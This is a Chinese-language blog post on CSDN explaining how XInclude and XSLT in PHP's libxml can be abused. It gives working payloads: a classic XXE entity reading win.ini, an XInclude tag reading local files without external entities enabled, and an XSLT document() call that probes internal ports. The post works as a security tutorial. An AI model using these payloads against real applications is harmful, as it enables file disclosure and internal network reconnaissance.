# xinclude和xslt的利用 - weixin_33985507的博客 - CSDN博客
2018年10月30日 18:45:00[weixin_33985507](https://me.csdn.net/weixin_33985507)阅读数：13
参考文献：[http://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/](http://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/)
#### 环境
```
libxml:2.9.4
win10
```
### Xinclude
用于合并`XML文档`的通用机制，通过在“主”文档中编写包含标记来自动包含其他文档或其他部分。生成的文档成为单个复合`XML信息集`。`XInclude`机制可用于合并`XML文件`或`非XML文本文件`中的内容。是xml标记语言中包含其他文件的方式
```
<html  xmlns = "http://www.w3.org/1999/xhtml"
      xmlns：xi ="http://www.w3.org/2003/XInclude">
```
**xi:include 元素**
*元素中的几个属性:*
- href — 对要包括的文档的 URI 引用。
- parse — 它的值可以是“xml”或“text”，用于定义如何包括指定的文档（是作为 XML 还是作为纯文本）。默认值是“xml”。
- xpointer — 这是一个 XPointer，用于标识要包括的 XML 文档部分。如果作为文本包括 (parse=”text”)，将忽略该属性。
- encoding — 作为文本包括时，该属性提供所包括文档的编码提示信息。
```
<xi:include href="test.xml" parse="text"/>
```
**xi:fallback元素**
- 类似于try...except...，如果xinclude的内容出现问题，则显示fallback的内容
例如
```
<xi:include href="test.xml" parse="text"/>
      <xi:fallback>Sorry, the file is unavailable<xi:fallback>
</xi:include>
```
#### 传统的XXE文件读取
```
<?php
$xml = <<<EOD
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "file:///c:/windows/win.ini">
]>
<x>&f;</x>
EOD;
$dom = new DOMDocument;
// let's have a nice output
$dom->preserveWhiteSpace = false;
$dom->formatOutput = true;
// load the XML string defined above
$dom->loadXML($xml);
// substitute xincludes
echo $dom->saveXML();
?>
```
![5035860-02f72a0f8c5e4172.png](https://upload-images.jianshu.io/upload_images/5035860-02f72a0f8c5e4172.png)
PS：当前的xml解析已默认不支持外部实体引入了
#### xinclude文件读取
```
<?php
#payload
$xml = <<<EOD
<?xml version="1.0" ?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include href="file:///d:/1.txt" parse="text"/>
</root>
EOD;
$dom = new DOMDocument;
$dom->preserveWhiteSpace = false;
$dom->formatOutput = true;
$dom->loadXML($xml);
$dom->xinclude();
echo $dom->saveXML();
?>
```
没有打开外部实体引用选项，却成功的读取`d:/1.txt`的内容
![5035860-05dab89074a8f746.png](https://upload-images.jianshu.io/upload_images/5035860-05dab89074a8f746.png)
PS：`xinclude`无需使用`LIBXML_NOENT`选项去开启默认关闭的外部实体引用
### xslt
XSL 指扩展样式表语言，而XSLT 指 XSL 转换，可以将`XML数据`转换为另外的`XML`或其它格式，如`HTML网页`，`纯文字`
**利用php，将xml转换为html**
- test.xml
```
<?xml version="1.0" encoding="utf-8"?>
<root>
    <name>Fruit</name>
    <fname>apple</fname>
    <description>red,delicious</description>    
</root>
```
- test.xsl
```
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<html>
<body>
<xsl:for-each select="root">
  <xsl:value-of select="name" /><br/>
  <xsl:value-of select="fname" /><br/>
  <xsl:value-of select="description" /><br/>
  </xsl:for-each>
</body>
</html>
</xsl:template>
</xsl:stylesheet>
```
- test.php
```
<?php 
$xslDoc = new DOMDocument();
$xslDoc->load("test.xsl");
$xmlDoc = new DOMDocument();
$xmlDoc->load("test.xml");
$proc = new XSLTProcessor();
$proc->importStylesheet($xslDoc);
echo $proc->transformToXML($xmlDoc);
```
![5035860-c8b349d2accadefa.png](https://upload-images.jianshu.io/upload_images/5035860-c8b349d2accadefa.png)
#### xsl端口探测
不需要开启外部实体引入，只需要使用`document()函数`。
```
<xsl:for-each select="root">
  <xsl:value-of select="name" /><br/>
  <xsl:value-of select="fname" /><br/>
  <xsl:value-of select="document('http://127.0.0.1:8080')" /><br/>
  </xsl:for-each>
```
![5035860-c138a49063b17f16.png](https://upload-images.jianshu.io/upload_images/5035860-c138a49063b17f16.png)
PS：当这个端口开启的时候，连这个端口开启的什么服务都知道
